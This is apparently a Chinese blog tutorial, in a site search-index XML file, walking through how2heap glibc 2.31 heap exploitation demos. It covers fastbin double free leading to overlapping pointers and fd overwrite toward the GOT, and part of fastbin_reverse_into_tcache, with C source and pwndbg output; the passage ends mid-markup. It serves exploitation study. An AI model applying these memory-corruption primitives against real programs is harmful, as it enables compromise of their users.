<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Educational Heap Exploitation 2.0 (how2heap glibc 2.31)</title>
      <link href="Education_Heap_Exploit_glibc_2.31.html"/>
      <url>Education_Heap_Exploit_glibc_2.31.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="how2heap-glibc-2-31"><a href="#how2heap-glibc-2-31" class="headerlink" title="how2heap glibc 2.31"></a>how2heap glibc 2.31</h2><p>前几天 how2heap 更新了，将主仓库划分成了 2.23 、2.27 以及 2.31 三个分类，这里我们来复习（学习） 一下 glibc 2.31 下的一些 heap exploit</p><h3 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h3><p>关于 fastbin attack 在glibc 2.31 上没有什么变化, 这里给的样例是通过 double-attack 漏洞修改 构造两个指针指向同一个 chunk 的情景。</p><p>程序首先 malloc 了 8 次, 然后 free 了7次（用来填充 tcache bins）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 tcachebins 已经填满</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x555555559320</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后用 calloc 分配 3 个chunk ， 使用 calloc 分配的时候，此时不会从 tcachebins 拿已经 free 的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span> <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">► <span class="number">23</span> <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">24</span></span><br></pre></td></tr></table></figure><p>然后进行 double free 操作即 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>此时我们注意到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  7]: 0x555555559360 —▸ 0x555555559340 —▸ 0x555555559320 —▸ 0x555555559300 —▸ 0x5555555592e0 —▸ 0x5555555592c0 —▸ 0x5555555592a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555555559390 —▸ 0x5555555593b0 ◂— 0x555555559390</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br></pre></td></tr></table></figure><p>此时存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         +----------------------------+</span><br><span class="line">         |                            |</span><br><span class="line">+--------+--------+          +--------+--------+</span><br><span class="line">|                 |          |                 |</span><br><span class="line">|      chunk a    |  +----&gt;  |      chunk b    |</span><br><span class="line">|                 |          |                 |</span><br><span class="line">+-----------------+          +-----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>chunk a 指向 chunk b ，同时 chunk b 也指向了 chunk a</p><p>然后如果我们再把他们占回来，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_dup.c</span><br><span class="line">   <span class="number">40</span></span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">   <span class="number">42</span> a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">43</span> b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">44</span> c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"> ► <span class="number">45</span> <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">   <span class="number">46</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">48</span></span><br><span class="line">   <span class="number">49</span> assert(a == c);</span><br><span class="line">   <span class="number">50</span> &#125;</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe230</span> ◂— <span class="number">0x700000008</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe238</span> —▸ <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe240</span> —▸ <span class="number">0x5555555593c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe248</span> —▸ <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe250</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe258</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe268</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— ...</span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">555555555428</span> main+<span class="number">511</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">16</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">17</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593c0</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br></pre></td></tr></table></figure><p>就会存在两个指针指向同一块 chunk，通常而言我们的下一步利用会找一个 size 符合当前fastbin 链的地址（_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。），然后在分配出 chunk a 的同时修改 chunk a 的 fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax r8  <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x5555555593b8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x5555555593c0</span> —▸ <span class="number">0x555555559390</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x5555555593c8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x5555555593d8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"></span><br><span class="line">## 修改 fd</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x5555555593c0</span>=<span class="number">0x555555557f78</span></span><br><span class="line">## 设置size 符合 fastbin链</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x555555557f80</span>=<span class="number">0x21</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5555555593c0</span> —▸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5555555593c8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5555555593d8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x5555555593e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x5555555593f8</span> ◂— <span class="number">0x20c11</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555557f78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555557f80</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br></pre></td></tr></table></figure><p>此时fastbin 链的结构就会被修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x555555559320</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x5555555593b0</span> —▸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br></pre></td></tr></table></figure><p>当执行到 分配 c chunk 的时候 ，我们就会拿到目标内存，总结一下就是</p><p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</p><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">                ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">        <span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">        a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h3><p>首先分配一定数量的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">19</span>   <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="number">20</span>   <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="number">21</span>   <span class="keyword">size_t</span> i;</span><br><span class="line">► <span class="number">22</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">  <span class="number">23</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="number">24</span>   &#125;</span><br></pre></td></tr></table></figure><p>然后 free 填充 tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">31</span>   <span class="comment">// Fill the tcache.</span></span><br><span class="line"> ► <span class="number">32</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">33</span>     <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">   <span class="number">34</span>   &#125;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x555555559480</span> —▸ <span class="number">0x555555559430</span> —▸ <span class="number">0x5555555593e0</span> —▸ <span class="number">0x555555559390</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x5555555592f0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>释放我们的目标 chunk 即这里的 ptrs[7]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">  <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">  victim</span><br><span class="line">);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>释放剩下的 8-14 的chunk</p><p>然后假设我们有一个堆溢出漏洞，可以覆盖 victim 的内容，我们此时将 栈上构造好的一个 list的地址赋予 victim </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">75</span>   <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">   <span class="number">76</span></span><br><span class="line">   <span class="number">77</span>   <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line"> ► <span class="number">78</span>   *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>   <span class="comment">//------------------------------------</span></span><br><span class="line">  ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p victim</span><br><span class="line">$<span class="number">1</span> = <span class="number">0x5555555594d0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594d0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax  <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x5555555594d8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br></pre></td></tr></table></figure><p>接下来，我们 malloc 7次 清空 tcache bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">86</span>   <span class="comment">// Empty tcache.</span></span><br><span class="line">   <span class="number">87</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">88</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">89</span>   &#125;</span><br><span class="line">   <span class="number">90</span></span><br><span class="line"> ► <span class="number">91</span>   <span 